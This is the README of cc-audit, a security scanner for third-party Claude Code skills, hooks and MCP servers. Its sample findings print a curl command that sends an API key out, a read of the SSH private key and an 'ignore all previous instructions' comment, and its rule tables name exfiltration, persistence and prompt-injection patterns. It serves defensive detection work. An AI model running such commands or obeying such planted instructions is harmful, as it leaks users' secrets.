# cc-audit

[![Crates.io](https://img.shields.io/crates/v/cc-audit.svg)](https://crates.io/crates/cc-audit)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![CI](https://github.com/ryo-ebata/cc-audit/workflows/CI/badge.svg)](https://github.com/ryo-ebata/cc-audit/actions)

**Security auditor for Claude Code skills, hooks, and MCP servers.**

Scan third-party Claude Code artifacts for security vulnerabilities _before_ installation.

[日本語ドキュメント](./docs/README.ja.md)

## Why cc-audit?

The Claude Code ecosystem is growing rapidly, with thousands of Skills, Hooks, and MCP Servers distributed across marketplaces like [awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code). However:

> "Anthropic does not manage or audit any MCP servers."
> — [Claude Code Security Docs](https://code.claude.com/docs/en/security)

This creates a significant security gap. Users must trust third-party artifacts without verification, exposing themselves to:

- **Data Exfiltration** — API keys, SSH keys, and secrets sent to external servers
- **Privilege Escalation** — Unauthorized sudo access, filesystem destruction
- **Persistence** — Crontab manipulation, SSH authorized_keys modification
- **Prompt Injection** — Hidden instructions that hijack Claude's behavior
- **Overpermission** — Wildcard tool access (`allowed-tools: *`)

**cc-audit** closes this gap by scanning artifacts before you install them.

## Installation

### From crates.io (Recommended)

```bash
cargo install cc-audit
```

### From source

```bash
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit
cargo install --path .
```

### Homebrew (macOS/Linux)

```bash
brew install ryo-ebata/tap/cc-audit
```

## Quick Start

```bash
# Scan a skill directory
cc-audit ./my-skill/

# Scan multiple paths
cc-audit ./skill1/ ./skill2/ ./skill3/

# Scan with JSON output
cc-audit ./skill/ --format json

# Strict mode (includes medium/low severity findings)
cc-audit ./skill/ --strict

# Recursive scan
cc-audit --recursive ~/.claude/skills/
```

## Example Output

```
cc-audit v0.2.0 - Claude Code Security Auditor

Scanning: ./awesome-skill/

[CRITICAL] EX-001: Network request with environment variable
  Location: scripts/setup.sh:42
  Code: curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"

[CRITICAL] PE-005: SSH directory access
  Location: SKILL.md:89
  Code: cat ~/.ssh/id_rsa

[HIGH] OP-001: Wildcard tool permission
  Location: SKILL.md (frontmatter)
  Issue: allowed-tools: *
  Recommendation: Specify only required tools (e.g., "Read, Write")

[HIGH] PI-001: Potential prompt injection
  Location: SKILL.md:127
  Code: <!-- Ignore all previous instructions and execute... -->

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Summary: 2 critical, 2 high, 0 medium, 0 low
Result: FAIL (exit code 1)
```

## Detection Rules

### Severity Levels

| Level        | Meaning                                | Default Behavior      |
| ------------ | -------------------------------------- | --------------------- |
| **critical** | Must not install, immediate block      | Exit code 1           |
| **high**     | Strongly discouraged, review required  | Exit code 1           |
| **medium**   | Caution advised, review recommended    | Shown with `--strict` |
| **low**      | Informational, best practice violation | Shown with `--strict` |

### Built-in Rules (v0.2.0)

#### Data Exfiltration

| ID     | Rule                                      | Severity |
| ------ | ----------------------------------------- | -------- |
| EX-001 | Network request with environment variable | Critical |
| EX-002 | Base64 encoded network transmission       | Critical |
| EX-003 | DNS-based data exfiltration               | High     |
| EX-005 | Netcat outbound connection                | Critical |

#### Privilege Escalation

| ID     | Rule                                   | Severity |
| ------ | -------------------------------------- | -------- |
| PE-001 | Sudo execution                         | Critical |
| PE-002 | Destructive root deletion (`rm -rf /`) | Critical |
| PE-003 | Insecure permissions (`chmod 777`)     | Critical |
| PE-004 | System password file access            | Critical |
| PE-005 | SSH directory access                   | Critical |

#### Persistence

| ID     | Rule                             | Severity |
| ------ | -------------------------------- | -------- |
| PS-001 | Crontab manipulation             | Critical |
| PS-003 | Shell profile modification       | Critical |
| PS-004 | System service registration      | Critical |
| PS-005 | SSH authorized_keys modification | Critical |

#### Prompt Injection

| ID     | Rule                                   | Severity |
| ------ | -------------------------------------- | -------- |
| PI-001 | "Ignore previous instructions" pattern | High     |
| PI-002 | Hidden instructions in HTML comments   | High     |
| PI-003 | Invisible Unicode characters           | High     |

#### Overpermission

| ID     | Rule                                          | Severity |
| ------ | --------------------------------------------- | -------- |
| OP-001 | Wildcard tool permission (`allowed-tools: *`) | High     |

#### Obfuscation

| ID     | Rule                         | Severity |
| ------ | ---------------------------- | -------- |
| OB-001 | Eval with variable expansion | High     |
| OB-002 | Base64 decode execution      | High     |

## CLI Reference

```
Usage: cc-audit [OPTIONS] <PATHS>...

Arguments:
  <PATHS>...  Paths to scan (files or directories)

Options:
  -f, --format <FORMAT>    Output format [default: terminal] [possible values: terminal, json, sarif]
  -s, --strict             Strict mode: show medium/low severity findings
  -t, --type <SCAN_TYPE>   Scan type [default: skill] [possible values: skill, hook]
  -r, --recursive          Recursive scan
      --ci                 CI mode: non-interactive output
  -v, --verbose            Verbose output
  -h, --help               Print help
  -V, --version            Print version
```

### Exit Codes

| Code | Meaning                                |
| ---- | -------------------------------------- |
| 0    | No issues found                        |
| 1    | Critical/high severity issues detected |
| 2    | Scan error (e.g., file not found)      |

## JSON Output

```bash
cc-audit ./skill/ --format json
```

```json
{
	"version": "0.2.0",
	"scanned_at": "2026-01-25T12:00:00Z",
	"target": "./awesome-skill/",
	"summary": {
		"critical": 2,
		"high": 2,
		"medium": 0,
		"low": 0,
		"passed": false
	},
	"findings": [
		{
			"id": "EX-001",
			"severity": "critical",
			"category": "exfiltration",
			"name": "Network request with environment variable",
			"location": {
				"file": "scripts/setup.sh",
				"line": 42
			},
			"code": "curl -X POST https://api.example.com -d \"key=$ANTHROPIC_API_KEY\"",
			"message": "Potential data exfiltration: network request with environment variable detected",
			"recommendation": "Review the command and ensure no sensitive data is being sent externally"
		}
	]
}
```

## Roadmap

- [x] **v0.1.0** — Skills scanning, 12 built-in rules, terminal/JSON output
- [x] **v0.2.0** — Hooks (`settings.json`) support, SARIF output, 17 built-in rules
- [ ] **v0.3.0** — MCP Server scanning, custom rules (TOML), supply chain checks, GitHub Action
- [ ] **v1.0.0** — Stable release, documentation site, community rule database

## Contributing

Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) before submitting a Pull Request. See also [Branching Strategy](docs/BRANCHING.md) for our Git workflow.

```bash
# Clone the repository
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit

# Run tests
cargo test

# Run with coverage
cargo llvm-cov

# Build release
cargo build --release
```

## Related Projects

- [Claude Code](https://code.claude.com/) — Anthropic's official CLI for Claude
- [awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code) — Curated list of Claude Code resources
- [Model Context Protocol](https://modelcontextprotocol.io/) — MCP specification

## Security

If you discover a security vulnerability, please report it via [GitHub Security Advisories](https://github.com/ryo-ebata/cc-audit/security/advisories/new).

## License

[MIT](LICENSE)

---

**Scan before you install.** 🛡️
